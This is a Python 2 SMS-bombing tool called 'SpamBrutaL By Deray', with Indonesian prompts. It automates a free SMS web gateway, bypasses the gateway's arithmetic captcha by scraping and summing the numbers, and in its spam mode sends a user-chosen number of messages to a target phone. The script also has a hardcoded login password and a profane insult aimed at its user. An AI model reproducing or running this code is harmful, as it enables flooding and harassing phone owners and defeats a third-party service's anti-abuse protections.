#!/usr/bin/env python
WHITEBOLD = '\x1b[1;37m'
WHITENORMAL = '\x1b[0m'
RED = '\x1b[1;37m\x1b[31m'
BLUE = '\x1b[1;37m\x1b[34m'
GREEN = '\x1b[1;32m'
ORANGE = '\x1b[33m'
CYAN = '\x1b[36m'
info = ('{}{}[{}*{}]{}').format(WHITEBOLD, CYAN, RED, CYAN, WHITENORMAL)
salah = ('{}[!]{}').format(RED, WHITENORMAL)
nanya = ('{}{}[?]{}').format(WHITEBOLD, ORANGE, WHITENORMAL)
deray = ('{}[{}{}deray{}]{}').format(RED, WHITENORMAL, CYAN, RED, WHITENORMAL)
try:
    import os, cookielib, re, random, re, marshal, time, getpass, mechanize, sys
except:
    print ('{}[++]{} Installing mechanize ...').format(GREEN, WHITENORMAL)
    os.system('pip2 install mechanize')

def printf(object):
    for perin in object:
        sys.stdout.write(perin)
        sys.stdout.flush()
        time.sleep(0.01)


ban = "\n  _____                       ____             _        _ \n / ____|                     |  _ \\           | |      | |\n| (___  _ __   __ _ _ __ ___ | |_) |_ __ _   _| |_ __ _| |\n \\___ \\| '_ \\ / _` | '_ ` _ \\|  _ <| '__| | | | __/ _` | |\n ____) | |_) | (_| | | | | | | |_) | |  | |_| | || (_| | |\n|_____/| .__/ \\__,_|_| |_| |_|____/|_|   \\__,_|\\__\\__,_|_|\n       | |                                                \n       |_|                                                \n                                                 By Deray\n=========================================================\n\n[1] MANUAL SMS\n[2] SPAM\n\n" + CYAN

class main:

    def __init__(self):
        self.br = mechanize.Browser()
        self.br.set_handle_equiv(True)
        self.br.set_handle_redirect(True)
        self.br.set_handle_robots(False)
        self.br.set_handle_referer(True)
        self.br.set_cookiejar(cookielib.LWPCookieJar())
        self.br.addheaders = [
         ('User-Agent', 'Mozilla/5.0 (Linux; Android 6.0.1; SM-G920V Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36')]
        self.menu()

    def menu(self):
        global salah
        rr = raw_input(('{} Choice>> ').format(nanya))
        if rr == '':
            return self.menu()
        if rr == '1':
            self.inputNomer()
            self.msg()
            self.kirim()
            self.oks()
            exit()
        else:
            if rr == '2':
                self.inputNomer()
                print ('{} Ketik koma untuk memisahkan random pesan').format(info)
                self.msg()
                self.spam()
                return self.readySpam()
            print ('{} Pilihan salah!').format(salah)
            return self.menu()

    def inputNomer(self):
        self.nomor = raw_input(('{} Nomor : ').format(nanya))
        if self.nomor == '':
            return self.inputNomer()
        if len(re.findall('\\d{13}', self.nomor)) != 0:
            print ('{} 13 nomor terdeteksi,apakah nomor benar?').format(info)
            r = raw_input(('{} Lanjutkan? y/n : ').format(nanya))
            if r.lower() != 'y':
                raise self.inputNomer()
        else:
            if len(re.findall('\\d{12}', self.nomor)) != 0:
                pass
            else:
                print '%s did u mean %s?? jangan ngasal dong KONTOL!!' % (deray, self.nomor)
                exit()

    def msg(self):
        self.pesan = raw_input(('{} Pesan : ').format(nanya)).replace('<s>', '\n').split(',')
        if self.pesan == '':
            return self.msg()

    def kirim(self):
        print ('{} Mengirim Pesan ...').format(deray)
        self.br.open('http://sms.payuterus.biz/alpha/index.php')
        print ('{} Bypassing Captcha ...').format(deray)
        self.br._factory.is_html = True
        a = self.br.response().read()
        b = re.findall('<span>(.*?) ', a)
        c = re.findall('\\+ (.*?) =', a)
        self.horee = int(b[0]) + int(c[0])
        self.pesen = random.choice(self.pesan)
        self.br.select_form(nr=0)
        self.br.form['nohp'] = ('{}').format(self.nomor)
        self.br.form['pesan'] = ('{}[SpamBrutaL By Deray] Powered By ').format(self.pesen)
        self.br.form['captcha'] = ('{}').format(int(self.horee))
        self.br.submit()

    def oks(self):
        ok = self.br.response().read()
        if len(re.findall('SMS Gratis Telah Dikirim', ok)) != 0:
            if len(re.findall('8 Menit', ok.lower())) != 0:
                print ('{} Tunggu 8menit dulu ya gannn:(').format(deray)
                exit()
            else:
                print ('{} Sms Terkirim :))').format(deray)
                r = raw_input(('{} Sms lagi? y/n : ').format(nanya))
                if r.lower() != 'y':
                    exit()
                else:
                    os.system('clear')
                    print ban
                    main()
        else:
            print ('{} Sms Terkirim :))').format(deray)
            r = raw_input(('{} Sms lagi? y/n : ').format(nanya))
            if r.lower() != 'y':
                exit()
            else:
                os.system('clear')
                print ban
                main()

    def spam(self):
        self.couts = 0
        self.loop = input(('{} Number of Looping: ').format(nanya))
        if self.loop == '':
            return self.spam()

    def readySpam(self):
        print '=' * 40
        print ('{} TARGET: {}').format(deray, self.nomor)
        print ('{} mengirim pesan sebanyak {} ...\n').format(deray, self.loop)
        babi = 0
        for bx in range(self.loop):
            babi += 1
            time.sleep(1)
            self.kirim()
            oke = self.br.response().read()
            if len(re.findall('SMS Gratis Telah Dikirim', oke)) != 0:
                if len(re.findall('8 Menit', oke.lower())) != 0:
                    print ('{} Tunggu 8menit dulu ya gannn:(').format(deray)
                    exit()
                else:
                    print ("{} {} Sms '{}' Terkirim :))").format(deray, babi, self.pesen)
            else:
                print ("{} {} Sms '{}' Terkirim :))").format(deray, babi, self.pesen)

        print ('\n{} Finished :))').format(info)
        print '=' * 40
        exit()


if __name__ == '__main__':
    pw = 'derayganteng'

    class login:

        def __init__(self):
            print ('[+] My Fb: {}https://facebook.com/achmad.luthfi.hadi.3{}').format(ORANGE, WHITENORMAL)
            print '[+] Welcome! BrutalSpam By Deray'
            print ('[+] {}Login!{}').format(GREEN, WHITENORMAL)
            self.log()

        def log(self):
            if os.path.exists('deray.txt'):
                if open('deray.txt').read().replace('\n', '') == 'derayganteng':
                    os.system('clear')
                    printf(ban)
                    main()
            login = getpass.getpass('[?] password: ')
            if login == pw:
                open('deray.txt', 'w').write(login)
                print '[+] Congratulations! Login Success..'
                time.sleep(3)
                os.system('clear')
                printf(ban)
                main()
                return self.log()
            if login == '':
                return self.log()
            print '[- Wrong password!'
            return self.log()


    def run():
        try:
            login()
        except Exception as f:
            print ('{} {}').format(salah, f)
            exit()


    run()
